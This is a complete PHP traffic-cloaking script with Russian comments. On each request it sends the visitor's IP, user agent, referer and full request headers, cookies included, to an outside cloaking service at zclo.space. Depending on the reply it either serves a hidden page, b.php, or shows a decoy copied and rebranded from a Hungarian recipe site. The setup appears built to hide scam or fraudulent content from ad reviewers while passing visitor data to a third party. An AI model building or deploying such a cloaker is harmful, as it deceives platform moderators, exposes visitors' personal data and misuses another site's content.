<?
//домен до кло
$imklo_link = "http://zclo.space";
//белый для подгрузки
$white_link = "https://www.nosalty.hu/receptek/";

$link = $_GET['link'];
$info = new SplFileInfo($link);
if ($info->getExtension() == 'php' || $info->getExtension() == 'html' || $info->getExtension() == '') {
    $post['ip'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    $post['domain'] = $_SERVER['HTTP_HOST'];
    $post['referer'] = @$_SERVER['HTTP_REFERER'];
    $post['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
    $post['url'] = $_SERVER['REQUEST_URI'];
    $post['headers'] = json_encode(apache_request_headers());
    $curl = curl_init($imklo_link . '/api/check_ip');
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_TIMEOUT, 60);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
    $json_reqest = curl_exec($curl);

    curl_close($curl);
    $api_reqest = json_decode($json_reqest);

    if (!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0) {
        $type = 'text/html';
    } else {
        require_once('b.php');
        exit();
    }
} else {
    $type = 'text/' . $info->getExtension();
}

header('Content-type: ' . $type);
$html = file_get_contents($white_link . $link);
$html = str_replace($white_link, "/", $html);
echo str_replace("www.nosalty.hu/receptek", $_SERVER['HTTP_HOST'], $html);
